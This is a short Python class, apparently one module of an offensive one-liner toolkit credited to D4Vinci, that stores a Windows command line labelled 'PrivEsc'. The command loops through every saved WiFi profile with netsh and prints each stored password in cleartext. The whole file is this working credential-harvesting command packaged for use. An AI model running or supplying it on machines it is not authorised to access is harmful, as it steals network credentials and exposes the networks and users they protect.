class info:
    author      = "Karim shoair (D4Vinci)"
    description = "One liner to grab all cleartext WiFi passwords"
    function    = "PrivEsc"
    liner       = 'cls & echo. & for /f "tokens=4 delims=: " %a in (\'netsh wlan show profiles ^| find "Profile "\') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on'
